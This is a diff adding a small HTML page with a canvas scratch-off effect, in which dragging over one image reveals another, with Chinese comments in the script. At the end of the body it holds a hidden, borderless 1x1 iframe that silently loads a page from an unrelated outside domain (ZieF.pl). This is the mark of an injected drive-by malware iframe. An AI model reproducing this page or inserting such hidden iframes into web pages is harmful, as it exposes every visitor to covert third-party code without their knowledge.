@@ -1,0 +1,80 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>无标题文档</title>
+	<meta name="viewport" content="initial-scale=1.0, width=device-width,minimum-scale=1.0,maximum-scale=1.0, user-scalable=no" />
+	<style type="text/css">
+	 body{
+		background:#000; 
+	 }
+	.xk{
+		
+		width:320px;
+		height:480px;
+		background:url(g15_back.jpg);
+		margin:50px auto;
+	}
+	font{
+		color:yellow;	
+	}
+
+</style>
+
+
+</head>
+
+<body> 
+
+	<div class="xk">
+    	<canvas  id="mycanvas" width="320px" height="480px"></canvas>
+    </div>
+    
+     <script type="text/javascript" >
+             
+			var load;
+            var canvas=document.getElementById('mycanvas');
+			var ready,canvas,context;
+            var ctx=canvas.getContext('2d');
+			var BRUSH_SIZE=18;
+			   	img=new Image();//创建image对象
+				img1=new Image();
+				img1.src="g15_back.jpg";
+				img.src="g15_up.jpg";//image的地址
+				img.onload=function(){
+				ctx.drawImage(img,0,0);//绘制原始图像，（0,0）表示图像的左上角位与canvas画布的位置
+				}
+				
+				bindEvents();//绑定事件
+				
+				function bindEvents(){
+					 canvas.ontouchstart = canvas.onmousedown = function(e) {    ready = true; };//鼠标摁下
+					canvas.ontouchend = canvas.ontouchcancel = canvas.onmouseup = canvas.onmouseout = (function(e) { ready = false; });//鼠标未摁下
+					canvas.ontouchmove = canvas.onmousemove = updateCanvas;//相应鼠标的移动事件
+				}
+				
+				function updateCanvas(e){
+				if(!ready) {//鼠标未摁下					
+					return;
+				}
+				var r = canvas.getBoundingClientRect();//获取当前canvas区域的坐标
+				var vx = e.clientX - r.left;//横向距离
+				var vy = e.clientY - r.top;//纵向距离
+			
+				var bs = BRUSH_SIZE;
+				var bsr = bs/2;
+			
+				// if ( vx < bsr || vy < bsr) {//据canvas边缘太近，则指定此时"擦拭"无效
+				// 	return;
+				// }
+				ctx.rect(vx-bsr, vy-bsr, bs, bs);//否则圈定当前一块区域方便被"替换"为下一幅图的相同区域
+				ctx.drawImage(img1, vx-bsr, vy-bsr, bs, bs, vx-bsr, vy-bsr, bs, bs);//替换
+			}
+							
+
+			
+ 	</script>
+
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
